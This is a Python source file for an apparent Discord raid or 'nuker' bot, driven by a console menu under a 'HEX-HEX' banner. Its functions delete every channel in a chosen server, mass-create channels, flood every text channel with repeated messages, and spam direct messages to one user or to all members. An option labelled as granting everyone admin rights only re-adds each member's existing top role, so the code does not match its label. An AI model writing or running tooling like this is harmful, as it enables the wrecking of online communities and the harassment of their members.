import discord
import asyncio
import os
import time
import sys
from itertools import cycle
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=None, intents=intents)


def print_bot():
    bot_name = bot.user.name if bot.user else "Allah"
    print(f"[ > ] Logged in as \033[95m{bot_name}\033[0m")
    print_server_count()


def print_server_count():
    bot_name = bot.user.name if bot.user else "Allah"
    server_count = len(bot.guilds)
    print(f"[ > ] \033[95m{bot_name}\033[0m is on \033[95m{server_count}\033[0m Servers active.")


def print_menu():
    menu_banner = """
██╗  ██╗███████╗██╗  ██╗     ██╗  ██╗███████╗██╗  ██╗
██║  ██║██╔════╝╚██╗██╔╝     ██║  ██║██╔════╝╚██╗██╔╝
███████║█████╗   ╚███╔╝█████╗███████║█████╗   ╚███╔╝ 
██╔══██║██╔══╝   ██╔██╗╚════╝██╔══██║██╔══╝   ██╔██╗ 
██║  ██║███████╗██╔╝ ██╗     ██║  ██║███████╗██╔╝ ██╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""
    print(f"\033[95m{menu_banner}\033[0m")


def run_tool():
    os.system('cls' if os.name == 'nt' else 'clear')
    token = get_bot_token()
    bot.run(token)


def get_bot_token():
    token = input("Enter bot token: ")
    return token


@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_bot()
    print_menu()
    await process_command()


async def process_command():
    while True:
        print('\033[95m' + "Select an option:" + '\033[0m')
        print("[1] Get a Server List")
        print("[2] Delete all Channels")
        print("[3] Give all Members ADMIN Permissions")
        print("[4] One-User DM")
        print("[5] MASS DM")
        print("[6] MASS Server Spam [Updating...]")
        print("[7] MASS Channel Generator")
        print()

        option = input("Enter your choice: ")

        if option == "1":
            await server()
        elif option == "2":
            await delete_channels()
        elif option == "3":
            await admin_digga()
        elif option == "4":
            await spam_user()
        elif option == "5":
            await mass_dm()
        elif option == "6":
            await server_spammi()
        elif option == "7":
            await channel_create()
        else:
            print("Invalid option selected")

        await delete_printed_messages()
        print_menu()


async def channel_create():
    server_list = []
    for index, guild in enumerate(bot.guilds):
        members = len(guild.members)
        server_list.append(f"{index + 1}. {guild.name} - Members: {members}")

    print("Select a server:")
    print('\n'.join(server_list))

    server_index = int(input("Enter the server index: ")) - 1

    if server_index < 0 or server_index >= len(bot.guilds):
        print("Invalid server index")
        return

    guild = bot.guilds[server_index]
    num_channels = int(input("Enter the number of channels to create: "))

    for i in range(num_channels):
        try:
            channel_name = f"Channel{i+1}"
            await guild.create_text_channel(channel_name)
            print(f"Channel '{channel_name}' created successfully")
        except Exception as e:
            print(f"Failed to create channel: {e}")

    print("Channel creation completed.")


async def server_spammi():
    server_list = []
    for index, guild in enumerate(bot.guilds):
        members = len(guild.members)
        server_list.append(f"{index + 1}. {guild.name} - Members: {members}")

    print("Select a server:")
    print('\n'.join(server_list))

    server_index = int(input("Enter the server index: ")) - 1

    if server_index < 0 or server_index >= len(bot.guilds):
        print("Invalid server index")
        return

    guild = bot.guilds[server_index]

    spam_message = input("Enter the spam message: ")
    spam_duration = int(input("Enter the spam duration in seconds: "))

    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            try:
                for _ in range(spam_duration):
                    await channel.send(spam_message)
                    await asyncio.sleep(1)
            except Exception as e:
                print(f"Failed to spam channel {channel.name}: {e}")

    print("Spamming completed.")


async def mass_dm():
    server_list = []
    for index, guild in enumerate(bot.guilds):
        members = len(guild.members)
        server_list.append(f"{index + 1}. {guild.name} - Members: {members}")

    print("Select a server:")
    print('\n'.join(server_list))

    server_index = int(input("Enter the server index: ")) - 1

    if server_index < 0 or server_index >= len(bot.guilds):
        print("Invalid server index")
        return

    guild = bot.guilds[server_index]

    spam_message = input("Enter the spam message: ")
    spam_duration = int(input("Enter the spam duration in seconds: "))

    for member in guild.members:
        try:
            for _ in range(spam_duration):
                await member.send(spam_message)
                await asyncio.sleep(1)
        except Exception as e:
            print(f"Failed to spam {member.name}: {e}")

    print("Spamming completed.")


async def spam_user():
    user_id = input("Enter the user ID to spam: ")
    spam_message = input("Enter the spam message: ")
    spam_duration = int(input("Enter the spam duration in seconds: "))

    user = bot.get_user(int(user_id))
    if not user:
        print("Invalid user ID")
        return
    try:
        for _ in range(spam_duration):
            await user.send(spam_message)
            await asyncio.sleep(1)
    except Exception as e:
        print(f"Failed to spam user: {e}")

    print("Spamming completed.")


async def admin_digga():
    server_list = []
    for index, guild in enumerate(bot.guilds):
        members = len(guild.members)
        server_list.append(f"{index + 1}. {guild.name} - Members: {members}")

    print("Select a server:")
    print('\n'.join(server_list))

    server_index = int(input("Enter the server index: ")) - 1

    if server_index < 0 or server_index >= len(bot.guilds):
        print("Invalid server index")
        return
    guild = bot.guilds[server_index]

    for member in guild.members:
        try:
            highest_role = member.top_role  # highest role
            await member.add_roles(highest_role)
        except Exception as e:
            print(f"Failed to grant admin role to {member.name}: {e}")

    print("Admin roles have been granted to all members.")


async def delete_channels():
    server_list = []
    for index, guild in enumerate(bot.guilds):
        members = len(guild.members)
        server_list.append(f"{index + 1}. {guild.name} - Members: {members}")

    print("Select a server:")
    print('\n'.join(server_list))

    server_index = int(input("Enter the server index: ")) - 1

    if server_index < 0 or server_index >= len(bot.guilds):
        print("Invalid server index")
        return
    guild = bot.guilds[server_index]
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Failed to delete channel {channel.name}: {e}")

    print("All channels have been deleted.")


async def server():
    server_list = []
    for guild in bot.guilds:
        members = len(guild.members)
        server_list.append(f"{guild.name} - Members: {members}")

    print('\n'.join(server_list))


async def delete_printed_messages():
    await asyncio.sleep(3)
    os.system('cls' if os.name == 'nt' else 'clear')


if __name__ == '__main__':
    run_tool()
